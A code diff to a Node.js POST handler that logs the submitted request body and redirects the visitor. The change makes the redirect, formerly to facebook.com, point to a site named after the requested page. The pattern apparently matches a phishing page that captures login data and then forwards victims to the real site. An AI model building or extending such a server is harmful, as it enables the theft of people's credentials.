@@ -47,10 +47,11 @@ async function POST(url, req, res) {
         body += chunk;
     });
     req.on('end', function(){
+        let result = url.replace('/', '').replace('.html', '');
         console.log(body)
 
         res.statusCode = 302;
-        res.setHeader('Location', 'https://www.facebook.com/');
+        res.setHeader('Location', `https://www.${result}.com/`);
 
         res.end()
     })
